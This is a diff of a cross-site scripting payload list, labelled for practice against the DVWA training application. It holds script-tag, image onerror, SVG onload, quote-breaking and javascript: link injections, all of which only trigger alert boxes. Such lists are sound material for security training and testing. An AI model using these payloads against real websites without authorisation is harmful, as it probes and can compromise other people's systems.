@@ -1,10 +1,24 @@
+# XSS Payloads for DVWA (Low/Medium Security)
+# One payload per line. Lines starting with # are comments.
+
+# --- Basic script injection ---
 <script>alert(1)</script>
+<script>alert('XSS')</script>
+<SCRIPT>alert(1)</SCRIPT>
+
+# --- Image tag injection ---
 <img src=x onerror=alert(1)>
-"><script>alert(1)</script>
-<svg onload=alert(1)>
+<img src="x" onerror="alert(1)">
 '"><img src=x onerror=alert(1)>
-<iframe src="javascript:alert(1)"></iframe> <!-- Event handler variations -->
-<!-- Encoding bypass techniques -->
-<!-- DOM manipulation XSS patterns -->
-<!-- JavaScript injection patterns -->
-<!-- WAF evasion and bypass techniques -->
+
+# --- SVG injection ---
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+
+# --- Context-breaking injection ---
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+# --- Event handlers ---
+<body onload=alert(1)>
+<a href="javascript:alert(1)">click</a>
